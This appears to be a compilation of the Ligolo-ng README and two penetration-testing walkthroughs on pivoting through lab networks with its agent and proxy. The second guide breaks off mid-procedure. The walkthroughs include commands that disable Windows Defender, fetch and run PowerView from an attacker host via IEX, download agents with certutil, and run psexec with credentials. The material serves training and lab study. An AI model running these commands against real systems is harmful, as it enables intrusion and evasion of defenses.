# Ligolo-ng : Tunneling like a VPN

[](https://github.com/nicocha30/ligolo-ng#ligolo-ng--tunneling-like-a-vpn)

[![Ligolo Logo](https://github.com/nicocha30/ligolo-ng/raw/master/doc/logo.png)](https://github.com/nicocha30/ligolo-ng/blob/master/doc/logo.png)

An advanced, yet simple, tunneling tool that uses TUN interfaces.

[![GPLv3](https://camo.githubusercontent.com/3a7dab0df64e2758b8984024a5a118e0220141563c595e9c3b5cd849f9d6160d/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d47504c76332d627269676874677265656e2e737667)](https://www.gnu.org/licenses/gpl-3.0) [![Go Report](https://camo.githubusercontent.com/e8425c01b6b4e37268e78119e368bd32fa40816ba5213861c64eee76c5f4b5f9/68747470733a2f2f676f7265706f7274636172642e636f6d2f62616467652f6769746875622e636f6d2f6e69636f63686133302f6c69676f6c6f2d6e67)](https://goreportcard.com/report/github.com/nicocha30/ligolo-ng) [![GitHub Sponsors](https://camo.githubusercontent.com/14407921995c17a6183354c36992c31245cc6ce03effbfaa507c0e5e1e0516ed/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73706f6e736f72732f6e69636f6368613330)](https://github.com/sponsors/nicocha30) [![GitHub Downloads (all assets, all releases)](https://camo.githubusercontent.com/9f153c78ff5966faea7353d7cb1dbbefaf49ff8f92bbe2c43a1dce3af3ac31a1/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732f6e69636f63686133302f6c69676f6c6f2d6e672f746f74616c)](https://camo.githubusercontent.com/9f153c78ff5966faea7353d7cb1dbbefaf49ff8f92bbe2c43a1dce3af3ac31a1/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732f6e69636f63686133302f6c69676f6c6f2d6e672f746f74616c)

[📑 Ligolo-ng Documentation (Setup/Quickstart)](https://github.com/nicocha30/ligolo-ng/wiki)

You use Ligolo-ng for your penetration tests? Did it help you pass a certification? Please consider sponsoring the project so I can buy my team some drinks. ☕

[❤️ Sponsor nicocha30](https://github.com/sponsors/nicocha30)

We would like to thank the following people for their support in the development of Ligolo-ng.

[![OSCPL-byte](https://github.com/OSCPL-byte.png)](https://github.com/OSCPL-byte)  

## Table of Contents

[](https://github.com/nicocha30/ligolo-ng#table-of-contents)

- [Introduction](https://github.com/nicocha30/ligolo-ng#introduction)
- [Features](https://github.com/nicocha30/ligolo-ng#features)
- [Demo](https://github.com/nicocha30/ligolo-ng#demo)
- [How is this different from Ligolo/Chisel/Meterpreter... ?](https://github.com/nicocha30/ligolo-ng#how-is-this-different-from-ligolochiselmeterpreter-)
- [How to use - documentation - tutorial](https://github.com/nicocha30/ligolo-ng#how-to-use---documentation---tutorial)
- [Does it require Administrator/root access ?](https://github.com/nicocha30/ligolo-ng#does-it-require-administratorroot-access-)
- [Supported protocols/packets](https://github.com/nicocha30/ligolo-ng#supported-protocolspackets)
- [Performance](https://github.com/nicocha30/ligolo-ng#performance)
- [Caveats](https://github.com/nicocha30/ligolo-ng#caveats)
- [Todo](https://github.com/nicocha30/ligolo-ng#todo)
- [Credits](https://github.com/nicocha30/ligolo-ng#credits)

## Introduction

[](https://github.com/nicocha30/ligolo-ng#introduction)

**Ligolo-ng** is a _simple_, _lightweight_ and _fast_ tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface** (without the need of SOCKS).

## Features

[](https://github.com/nicocha30/ligolo-ng#features)

- **Tun interface** (No more SOCKS/Proxychains!)
- Simple UI with _agent_ selection and _network information_
- Easy to use and setup
- Automatic certificate configuration with Let's Encrypt
- Performant (Multiplexing)
- Does not require privileges on the _agent_
- Socket listening/binding on the _agent_
- Multiple platforms supported for the _agent_
- Can handle multiple tunnels
- Reverse/Bind Connection
- Automatic tunnel/listeners recovery (in case of network issues)
- Websocket support

## Demo

[](https://github.com/nicocha30/ligolo-ng#demo)

 Ligolo-ng-demo.webm 

## How is this different from Ligolo/Chisel/Meterpreter... ?

[](https://github.com/nicocha30/ligolo-ng#how-is-this-different-from-ligolochiselmeterpreter-)

Instead of using a SOCKS proxy or TCP/UDP forwarders, **Ligolo-ng** creates a userland network stack using [Gvisor](https://gvisor.dev/).

When running the _relay/proxy_ server, a **tun** interface is used, packets sent to this interface are translated, and then transmitted to the _agent_ remote network.

As an example, for a TCP connection:

- SYN are translated to connect() on remote
- SYN-ACK is sent back if connect() succeed
- RST is sent if ECONNRESET, ECONNABORTED or ECONNREFUSED syscall are returned after connect
- Nothing is sent if timeout

This allows running tools like _nmap_ without the use of _proxychains_ (simpler and faster).

## How to use - documentation - tutorial

[](https://github.com/nicocha30/ligolo-ng#how-to-use---documentation---tutorial)

You will find the documentation for Ligolo-ng, as well as the steps to follow to get it up and running on the [Ligolo-ng Wiki](https://github.com/nicocha30/ligolo-ng/wiki)

## Does it require Administrator/root access ?

[](https://github.com/nicocha30/ligolo-ng#does-it-require-administratorroot-access-)

On the _agent_ side, no! Everything can be performed without administrative access.

However, on your _relay/proxy_ server, you need to be able to create a _tun_ interface.

## Supported protocols/packets

[](https://github.com/nicocha30/ligolo-ng#supported-protocolspackets)

- TCP
- UDP
- ICMP (echo requests)

## Performance

[](https://github.com/nicocha30/ligolo-ng#performance)

You can easily hit more than 100 Mbits/sec. Here is a test using `iperf` from a 200Mbits/s server to a 200Mbits/s connection.

```shell
$ iperf3 -c 10.10.0.1 -p 24483
Connecting to host 10.10.0.1, port 24483
[  5] local 10.10.0.224 port 50654 connected to 10.10.0.1 port 24483
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-1.00   sec  12.5 MBytes   105 Mbits/sec    0    164 KBytes       
[  5]   1.00-2.00   sec  12.7 MBytes   107 Mbits/sec    0    263 KBytes       
[  5]   2.00-3.00   sec  12.4 MBytes   104 Mbits/sec    0    263 KBytes       
[  5]   3.00-4.00   sec  12.7 MBytes   106 Mbits/sec    0    263 KBytes       
[  5]   4.00-5.00   sec  13.1 MBytes   110 Mbits/sec    2    134 KBytes       
[  5]   5.00-6.00   sec  13.4 MBytes   113 Mbits/sec    0    147 KBytes       
[  5]   6.00-7.00   sec  12.6 MBytes   105 Mbits/sec    0    158 KBytes       
[  5]   7.00-8.00   sec  12.1 MBytes   101 Mbits/sec    0    173 KBytes       
[  5]   8.00-9.00   sec  12.7 MBytes   106 Mbits/sec    0    182 KBytes       
[  5]   9.00-10.00  sec  12.6 MBytes   106 Mbits/sec    0    188 KBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.00  sec   127 MBytes   106 Mbits/sec    2             sender
[  5]   0.00-10.08  sec   125 MBytes   104 Mbits/sec                  receiver
```

## Caveats

[](https://github.com/nicocha30/ligolo-ng#caveats)

Because the _agent_ is running without privileges, it's not possible to forward raw packets. When you perform a NMAP SYN-SCAN, a TCP connect() is performed on the agent.

When using _nmap_, you should use `--unprivileged` or `-PE` to avoid false positives.

## Todo

[](https://github.com/nicocha30/ligolo-ng#todo)

- Implement other ICMP error messages (this will speed up UDP scans) ;
- Do not _RST_ when receiving an _ACK_ from an invalid TCP connection (nmap will report the host as up) ;
- Add mTLS support.

## Credits

[](https://github.com/nicocha30/ligolo-ng#credits)

- Nicolas Chatelain <nicolas -at- chatelain.me>

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/nicocha30/ligolo-ng). Be sure to check out the original post for more details.

# How to Tunnel and Pivot Networks using Ligolo-ng

On my journey to take on the [OSCP](https://www.offsec.com/courses/pen-200/) I learned that pivoting/tunneling can be a confusing concept at first for beginners. After doing extensive research I came across an awesome easy to use tool called [Ligolo-ng](https://github.com/nicocha30/ligolo-ng). Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).

![](https://miro.medium.com/v2/resize:fit:500/1*S8eRe-tKrEPS1AWwWRHjXw.gif)

To follow this walkthrough or do some practicing I would recommend signing up with [Hack The Box Pro labs](https://www.hackthebox.com/hacker/pro-labs). The pro labs have a lot of pivoting/tunneling involved that will help boost your comfort with these concepts and get you ready to take on the OSCP or real world pen tests.

**Step 1:**

To start off you will need to download the agent and proxy files from the ligolo-ng releases page on github. The agent and proxy will depend on what system you are on and the system you are targeting. The agent will be ran on the target machine and the proxy tool will be ran on your machine.

**Agent-** Target machine

**Proxy-** Attacker machine (Yours)

You can download them manually from the web interface or just grab them with the [_wget_](https://linuxize.com/post/wget-command-examples/) command in the current working directory you are in. I like to put all tools in my _/opt_ directory with a designated folder for the tools.

cd /opt  
  
mkdir ligolo  
  
cd ligolo

**Agent File:**

sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz

**Proxy File:**

sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

Now we need to unpack these files with the following commands and I recommend renaming them to the specific system you are going to use them on.

tar -xvf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz  
  
ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz  
  
sudo mv proxy lin-proxy  
  
sudo mv agent lin-agent

**Step 2:**

There are some prerequisite commands we need to run before launching ligolo. These commands create a tun interface on the Proxy Server (C2).

sudo ip tuntap add user [your_username] mode tun ligolo  
  
sudo ip link set ligolo up

On your machine get ligolo running:

./lin-proxy -selfcert -laddr 0.0.0.0:443 

**_Note:_** You can chose any port to listen on. I chose 443 because this port is known by most firewalls and wont get flagged.

![](https://miro.medium.com/v2/resize:fit:700/1*ermCj8d199rHTXeCabiXlA.png)

Ligolo tool running

In another window once the above commands are all followed we need to push the agent file onto the target machine. You can accomplish this by running a python web server in the directory where the agent file resides.

sudo python -m http.server 80

Grab the agent file from the attacker machine using wget.

Run these commands on the Target Machine:

wget http://<your attacker machine IP here>/lin-agent  
  
chmod +x lin-agent  
  
./lin-agent -connect <attacker IP here>:443 -ignore-cert

![](https://miro.medium.com/v2/resize:fit:700/1*MeSYHb1wE5Sm_MCQdO2r9A.png)

Connection Established

You should see the connection get grabbed by the ligolo tool if the commands were ran successfully on target machine. You can manage your tunneled sessions in the tool by typing _session_ in the above example screenshot and you can toggle between them once more are established. \

**Step 3:**

On the target machine if you enumerated you can discover other network interfaces the machine is interacting with or established connections to other internal IP’s. This will help us pivot to other networks and continue our attacks.

Run the following commands to discover other networks the machine is interacting with:

**Linux Machine:**

netstat -an  
  
ip route  
  
ifconfig

![](https://miro.medium.com/v2/resize:fit:700/1*anETmaE0Qq9KimN98VPT2w.png)

Target machine showing indicators of other networks

Now that we have the target network we want to pivot to in order to reach the other hosts and attack them lets add them to ligolo routes and start them.

On Attacker machine run:

sudo ip route add 192.168.110.0/24 dev ligolo

![](https://miro.medium.com/v2/resize:fit:700/1*vz1TK5tDrxppqOAWrcBMIQ.png)

My routes for each machine compromised

Now you should be able to reach those other IP’s and perform attacks ;)

**Step 4 (Next Pivot):**

Let’s say we get a hold of a domain controller from carrying out our attacks from that subnet we pivoted to, and we notice now that this host is on Windows and is also communicating with another subnet after doing some enumeration. You can use some commands to enumerate and utilize powerview or [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).

PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows “net *” commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality.

[

## PowerTools/powerview.ps1 at master · PowerShellEmpire/PowerTools

### This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below…

github.com



](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1?source=post_page-----cf828e59e740--------------------------------)

**Windows Machine:**

netstat -an | findstr "192.168."

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true

(New-Object System.Net.WebClient).DownloadString(‘http://<your IP Here>/powerview.ps1') | IEX

Get-NetForestTrust

We notice that a new subnet is being interacted with and new domain discovery after doing the above enumeration techniques.

![](https://miro.medium.com/v2/resize:fit:569/1*Vxt31tzBYyjpH4T3Uf2MXQ.png)

Netstat output

![](https://miro.medium.com/v2/resize:fit:700/1*6O8Msl3Uc_PcqvkkP0NzMw.png)

Download the windows agent that matches your targets architecture in my case its 64-bit and then push it onto the machine the same way we did above but this time slightly different steps since this is a windows machine..

[

## Release v0.4.3 · nicocha30/ligolo-ng

### An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface. - Release v0.4.3 · nicocha30/ligolo-ng

github.com



](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.4.3?source=post_page-----cf828e59e740--------------------------------)

**On your attacker machine:**

sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Windows_64bit.zip

You might already have your python web server still running from before so make sure you have the same file in the directory you are serving from.

sudo python -m http.server 80

**On the Windows machine:**

certutil.exe -urlcache -split -f "http://<Your IP Here>:80/win-agent.exe"

![](https://miro.medium.com/v2/resize:fit:700/1*4LRo5K3WR6FmrM_csCv_yw.png)

Now lets establish a connection with the agent:

./win-agent.exe -connect <your IP here>:443 -ignore-cert

You should see two sessions available now when running the _session_ command in ligolo.

![](https://miro.medium.com/v2/resize:fit:601/1*WarfzosybpKdL1EWbq6JhA.png)

Now that we know the next IP route lets add it to ligolo and start it.

**On your linux machine:**

sudo ip route add 192.168.210.0/24 dev ligolo

You should see the following if command was added correctly..

![](https://miro.medium.com/v2/resize:fit:643/1*WEwSM3ZhJJ9tPKsCr-F1-g.png)

Go back to your ligolo interface running and type _session_ and select the machine with the new tunnel and type _start._ It will ask you if you want to switch tunnels just select yes..

![](https://miro.medium.com/v2/resize:fit:700/1*KHb_xtjylkcKdrr8BnGR6Q.png)

You should now have learned how to pivot to two different networks. This process will be rinsed and repeated when seeing other machines on the network communicating to other subnets. You will push the agent file on the machine that is communicating with another network or domain and have it connect back to the ligolo interface then route that IP subnet with ligolo and type start.

I hope you found this walkthrough helpful please share with others and ensure to follow and comment if you have any questions!

![](https://miro.medium.com/v2/resize:fit:500/1*BSbXzu_HEiDi2fdnIG_8Lg.gif)

Stay Hacking and Never Slacking ;)

**Credit:** This information was adapted from an excellent guide on [Medium](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740). Be sure to check out the original post for more details.

# A Detailed Guide on Ligolo-Ng

[February 9, 2024](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/) by [Raj](https://www.hackingarticles.in/author/raj/)

This comprehensive guide delves into the intricacies of Lateral Movement utilizing Ligolo-Ng, a tool developed by Nicolas Chatelain. The Ligolo-Ng tool facilitates the establishment of tunnels through reverse TCP/TLS connections using a tun interface, avoiding the necessity of SOCKS. This guide covers various aspects, from the tool’s unique features to practical applications such as single and double pivoting within a network.

**Download Ligolo-Ng:**

Ligolo-Ng can be downloaded from the official repository: [Ligolo-Ng Releases](https://github.com/nicocha30/ligolo-ng/releases).

### Table of Contents:

1. Introduction to Ligolo-Ng
2. Ligolo V/S Chisel
3. Lab Setup
4. Prerequisites
5. Setting up Ligolo-Ng
6. Single Pivoting
7. Double Pivoting

### Ligolo-Ng Overview:

Ligolo-Ng is a lightweight and efficient tool designed to enable penetration testers to establish tunnels through reverse TCP/TLS connections, employing a tun interface. Noteworthy features include its GO-coded nature, VPN-like behavior, customizable proxy, and agents in GO. The tool supports multiple protocols, including ICMP, UDP, SYN stealth scans, OS detection, and DNS Resolution, offering connection speeds of up to 100 Mbits/sec. Ligolo-Ng minimizes maintenance time by avoiding tool residue on disk or in memory.

### Ligolo V/S Chisel:

- Ligolo-Ng outperforms Chisel in terms of speed and customization options.
- Chisel operates on a server-client model, while Ligolo-Ng establishes individual connections with each target.
- Ligolo-Ng reduces maintenance time by avoiding tool residue on disk or in memory.
- Ligolo-Ng supports various protocols, including ICMP, UDP, SYN, in contrast to Chisel, which operates primarily on HTTP using a websocket.

### Lab Setup

Follow the step-by-step guide for lateral movement within a network, covering both single and double pivoting techniques.

**![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhvOyJmtPRRGGMaziGrnplh790yGs6EmvG92ltCb8BQPtMIEEz6eRim_f1yOAy5wRNg4xFIuIfIjoX-uAEH26pq6w3MrS1HQ-aw_Vo1JqgqzqAeP2u5dJCtcwpivAZ5DERrDXSSfz7RGKON9I1hyFjh6OrJ7UWqKwNarERs98vqTOu6UyUnTY4CY4C2Knw/s16000/0%20(2).png)**

### Prerequisites

Obtain the Ligolo ‘agent’ file for Windows 64-bit and the ‘proxy’ file for Linux 64-bit.

Install the ‘agent’ file on the target machine and the ‘proxy’ file on the attacking machine (Kali Linux).

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjy_RU0S7LYChZmEfxIT2Ags51YsUlcF4bSlPkywQHZzF3o7RNdB5uCqPV7-L5LPNgmZrS-iITYhfPgPGHnIyi33ktuVOqQN2Qo6gzQuA8uvNS6ZYlXgUQJ98ES81D0IVxudYS_0snRCznA6wrKGQred74RixbCkzkZTPMmrfz7xCHxRU7farKCs9kdWtFJ/s16000/1.png)

### Setting up Ligolo-Ng

**Step 1:** Following the acquisition of both the agent and proxy files, the next step involves the setup of Ligolo-Ng. To ascertain the current status of Ligolo-Ng configuration, the ‘ifconfig’ command is employed. To initiate activation, execute the prescribed sequence of commands as follows:

ip tuntap add user root mode tun ligolo

ip link set ligolo up

Verify Ligolo-Ng activation with: **‘ifconfig’** command

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhne9BWPGFfoiqmWRHQAH1dbF5X1WNXbkJ2Lv86mZmlPK0X6yo6hr52cvvCOSp7l0Euik_c_LF80RQvJMdHvr3lfRTMnQYWCVZ0c0i4AwT2ztm_nGl0X5mZv3cFChLjpdS2pHmPB56FCSsQP54DmHpTHp3Rbx6sMUX-Q2AnSDwI2mHwIxBzgZR60Stlc-zF/s16000/2.png)

**Step2:** Unzip the Ligolo proxy file:

tar -xvzf ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz

This proxy file facilitates the establishment of a connection through Ligolo, enabling us to execute subsequent pivoting actions. To explore the full range of options available in the proxy file, utilize the ‘help’ command

./proxy -h

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixVbB1mW2i2xB9glLOefgy8TyEvM8_URqUwRQ-BKUX3bFVLqP9poZa9DNARDxQHCZSTcASOPFPKwIL2-6NsoEP8vibBqeGQ0KjXWQ-xBwxOu9lxJSauawKNZXGYl5F0CNodRaAG1aXSM2QnXkZ3PPaJT0dMPRmPChpYGEH-Q_RGtUXxlu9o9qzfFyQXsAw/s16000/3.png)

**Step 3:** The options displayed in the preceding image are designed for incorporating various types of certificates with the proxy. The chosen approach involves utilizing the ‘-selfcert’ option, which operates on port 11601. Execute the provided command, as illustrated in the accompanying image below:

./proxy -selfcert

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWh0HJjXDdD9vYKgyplERpPjc8vfY576KvWXxLPm6kXcP9LoQFimiK5_R8G6-EkwyzK8gYbOlDI6WutRat2VQi7f2d4_N-RunDDT_Pe7jNEq0hPDBnTjXp-XylDKwWOLZLjZubnVszI6wxG1tLlHPZwOgnYdsExnTGVjrg-sF-CKYFMWw_pMxQcFoGuTdU/s16000/4.png)

**Step 4:** By executing the aforementioned command, Ligolo-Ng becomes operational on the attacking machine. Subsequently, to install the Ligolo agent on the target machine, unzip the ligolo agent file using the command:

unzip ligolo-ng_agent_0.5.1_windows_amd64.zip

To facilitate the transmission of this agent file to the target, establish a server with the command:

updog -p 80

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLOal782eqgI-9diryXXvQAwNgvurwpTWqkpz7_469K1D68HDYWU-U5cLCaIcL8mkN1rN1jXhnfzNjfRKm_LVxXbIspM_6FWCIYxYN2Xc7YZ7L2JLDnnqH-DLKfHA1aVjiDush5fZi6eBoKhNCyBZ71wQxLc0GsW2HTN0yJstCll4u9_k6aber5MwqF0M9/s16000/5.png)

**Step 5:** In the context of lateral movement, a session has been successfully acquired through netcat. Utilizing the established netcat connection, the next step involves downloading the Ligolo agent file onto the target system. Referencing the image below, execute the provided sequence of commands:

cd Desktop

powershell wget 192.168.1.5/agent.exe -o agent.exe

dir

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhebsEEJ06iSf33oK0zvAykgTNCp-e_hjpCode1XTrnWsjxfdhMevtvvVv2XLV8MN3P5UQEbRlFtKQ4dmWzsua0sJTPPR0ovP59lM3-GcjDhxr9jAADkjyFrVFXX7IjMtzd559QYhbmhZC3q8c9zKuxApDS3-1HnG1pf4Kq4W31EGjRyWYaJezCbJNnoOS0/s16000/6.png)

**Step 6:** Evidently, the agent file has been successfully downloaded. Given that the proxy file is presently operational on Kali, the subsequent action involves executing the agent file.

./agent.exe -connect 192.168.1.5:11601 -ignore-cert

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-sFXx1XOKCVK1q2h9s-lA9L7QqFCbu3MMmeGgFR8VjJiuRvjzW7Pf0KiHsVgMjuvFRfD8baJuzANZ_nyKhZXtVXDhPwoL2R4rjlSFNtButi7Ba0Hza3D9RIlwkc53pm5u_QW9Kq51EJyaQP-pT0XU-9eP-U6kHZh1YjQDOfNsiWedd0qA9Kl3sGNTkkFm/s16000/7.png)

Upon executing the specified command, a Ligolo session is initiated. Subsequently, employ the ‘session’ command, opting for ‘1’ to access the active session. Following the session establishment, execute the ‘ifconfig’ command as illustrated in the provided image.

Notably, it discloses the existence of an internal network on the server, denoted by the IPv4 Address 192.168.148.130/24. This discovery prompts further exploration into creating a tunnel through this internal network in the subsequent steps.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4mjv_1QxY6QZaw7nyR7vagoJ2pAGNmQvabLXHEQU4A8IcTvxhiI6QA7p3iYqeLypIi5uer5sEU_mREaQjF9UMurV8CpW0bnq-r7ScaSkRwteClFuc90e9TOh439PLonWVjH8oz7NKW_kggTno6FUymD-oVLm_ibJy4oIZmWoypXejeMyERQfF5lf8Ryop/s16000/8.png)

### Single Pivoting

In the single pivoting scenario, the aim is to access Network B while staying within the boundaries of Network                                 

                                      ![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuhNXjCf1K26YEXV5c4rv03GPpQjqsb2uCwj-jXjRxTE4rhCmbvOu9ieAtg6SbPwwoEbGxPyVwe-vmNfm0mDC8M6qKAMzYCEFaGOR2rOYHA3r4zu1EFn1o2xyqE7wn6uzGlFxxcF86z2Xc_LqU4ONH76OSI2Bf_RJdm4Ard2xX0KNgrpV9KVuBNC-7Y5NS/s16000/8_0.png)

Attempting a direct ping to Network B reveals, as illustrated in the image below, the impossibility due to different network configuration.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTr1lQLH_QAds0wtEHOJtkiXYnsLPFe6gSo7m9R5fY-h8AfdVsORDvkJMnthJnwMmB5j0kassK4zBRJHppctiKZsBq13A12oFfLh6tn39lNff8y2mjouY5PCI8tO3pnI-7KdHzJyvza0wqmaIP3-KutuiDWUV1BMlgtocQbDUyk7AJaVTJGuhQKDUwKHhC/s16000/8_1.png)

To progress towards the single pivoting objective, a new terminal window will be opened. Subsequently, the internal IP will be added to the IP route, and the addition will be confirmed, as illustrated in the image below, utilizing the following commands:

ip route add 192.168.148.0/24 dev ligolo

ip route list

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhv5KFovvhujze3Rp-BDiPDoA2qxRzDZ4rF4pggTVa2FBQV0rvuIjJjvo16PmlP84xixcOOWRX7FSsLHwkiGj5j2xNlnZZ1F_p-wqsNe_sLR-59IfLCu7MYausTJk_IFwFN3Xz40OYh6CKM8fqJb1F9tFyd6l-A4S8nOqZlx0UKUf1vqkZcGRVmrJyxc0p6/s16000/9.png)

Return to the Ligolo proxy session window and initiate the tunneling process by entering the ‘start’ command, as demonstrated in the provided image.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh16KQ11MS_-BFE50-hjsjAcalJltSNBCWYwLWEYhwOMZA9h9yiuoO9yUuiXlNREypvOPZcPRmpUCTRzGFE3OEKHG20e6Tscak_yNCpVVvxLFr3r1BopOkrG0KKIMB3pkc52vc45snlppv6l-nK17ZFKZ9hyqPOdPQI09QJUVe_yNTx5kk1ruMxMxdZNSq7/s16000/10.png)

Upon establishing a tunnel into network B, we executed the netexec command to scan the network B subnet, unveiling an additional Windows 10 entity distinct from DC1, as depicted in the image.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKTkUrmmA4RmLiSmEJdKIs82QzwlXMuOfRDWPrhj3fPP90p3vH18fMHV3_wLy5SdF9y6L6wA7hdmkKgTPvNPnmowobWrfQJm78tVCbnWxEcOr2iqHZJSXaYMhvlbGbwuyLwWxO_Hh6botPln7Yl2Xt1m8NeAQLGSEy-tw8NrmbITz2hKuGeD14CqJCwEFy/s16000/11.png)

Upon attempting to ping the IP now, successful ping responses will be observed, a contrast to the previous unsuccessful attempts. Additionally, a comprehensive nmap scan can be conducted, as illustrated in the image below.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_Z9JA9DDc7uaROLGl5ROO9regLfIpStCky4Y4j-2Mk10DrrqFVvNMGpdS9hMZickHcpZI1LQAnHlyVB-2dRp9Qfx9R-VtWWdtl2mDs2ugoouxo3PKTnNyFCVW1L-_6dK34X92eFafY4Z-WS6GquAowgAfxnf_5U41CLwIUxWb2YM3t98yW0_J5HRP2N9T/s16000/12.png)

### Double Pivoting

In the process of double pivoting, our objective is to gain access to Network C from Network A, utilizing Network B as an intermediary.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8GwMd8Uw6hMmZMZkCFK5YxCN4_MdmMidck5qBewqXnK9DLeg0rcJDil9byRvMqwTeJf9YNRlXvDRPV7dk2_ozbS_l9eL0EHBNtV0irevhGHdYEZ5NOeeUK0y3YFrjLGq5HfJ5wPu9KRNp2YoUy8qPpqQzWlcERizYnsiM5xQ7uvhJH08Jl8NDelgH0Diq/s16000/12_1.png)

From the newly opened terminal window, utilize the Impacket tool to access the identified Windows 10 with the IP 192.168.148.132. Following this, execute the subsequent set of commands to download the Ligolo agent onto Windows 10

impacket-psexec administrator:123@192.168.148.132

cd c:\users\public

powershell wget 192.168.1.5/agent.exe -o agent.exe

dir

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRmyizQf5ZvDngD2D725UxM6q2-FhyphenhyphenlvpTNsqh5RCNbPWc9LF40QQgeuM0f9_kOi_sN6McPUu_bfO3C4ozNJUoclCbQAQ7hDDJu_19lRt2pJOoeRrVkzxur-almmlPKFWEHwNEl79YSsFx4Iczsu5WkQuV8uTVcCBvj4pcGjvdEYXQdneqt2D1jMj-uxS2/s16000/13.png)

Subsequently, initiate the execution of the agent.exe. Upon completion, a session will be established, given that our Ligolo proxy file is already operational.

agent.exe -connect 192.168.1.5:11601 -ignore-cert

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPsRYN3ePRTrs35ogR0aT_ULRGE8nROJBWPBYrfAhydbfNNecBZquR9RY_fAOb-A74vFqeKIBo3W0BP92NQ3Bj3UaPLoH6gpbgLQD-1N0z9nLqk3iknMJahnIAtA4m9zoKM9E8EEaqU-xhOh0HCXv2YawIfen4W1lELLryaURHKSdXauLXWCwIr1HWT29d/s16000/14.png)

Examine Ligolo-ng proxy server, a new session, corresponding to Windows 10, will be present, as indicated in the accompanying image. Execute the ‘start’ command to initiate additional tunnelling.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEih5KMswGU2_YlJT5bo4pYw7O_-EAsZB2wiWYQcKq8xFrynB3WWfJ05o92jh8xz3L98VCORvH2v64foXaWp-M-BEcPZw3_s7lILl7LsfKJuvy_abX3ydJKF2HMFHp5lSBDi0FmjQZQXXeI3HNkw6x3A2diR7aXpfZv8Jhq5VTKxtLr5nc6uBMWbe31oPlgy/s16000/15.png)

Execute the ‘session’ command to display the list of sessions. Navigate through the sessions using arrow keys, selecting the desired session for access. In this instance, the aim is to access the latest session, identified as session 2. Select this session and utilize the ‘ifconfig’ command to inspect the interfaces. This action reveals an additional **network C** interface with the address **192.168.159.130/24**, mirroring the details depicted in the image below.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBaIBkua2OSamc_38VF1Qj8WdBvlkIIqEYiK7fe6-4z2dRLkZGQqNfi8fVBea4CssisWJRUN0cZl1H769YEvg68zU27Fb08NaLTe6KksLzRyC5TbCg-5Q8FXbQzAokyuTSvF_KhBYDNs4boNeKI7qk02OHehaC9H3E64l5QuGht6YDYOn1inf0AVTB315i/s16000/16.png)

Upon identifying the new network, the initial step involves attempting a ping. However, the image below indicates an absence of connectivity between Kali and the network C.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQp0xcIaW4vn2KffSqLK64d_HHaofbC061qg9ITK0KfalwhApWrlFJmuzQlYxkN9lTlTPX3yyHh1uIyBfKl4cZFq-_3OtqCnfRI-qBUixFVI6zbUs7iTLXw0mAHQj3MeSJgVb4T6q1P08n7Asgu8ydxnUXHYMpMWZIrcTtDLYy_5zbPwh_QAtJIwBizTDX/s16000/17.png)

Add the Network C Subnet in the IP route list with the following command.

ip route add 192.168.159.0/24 dev ligolo

ip route list

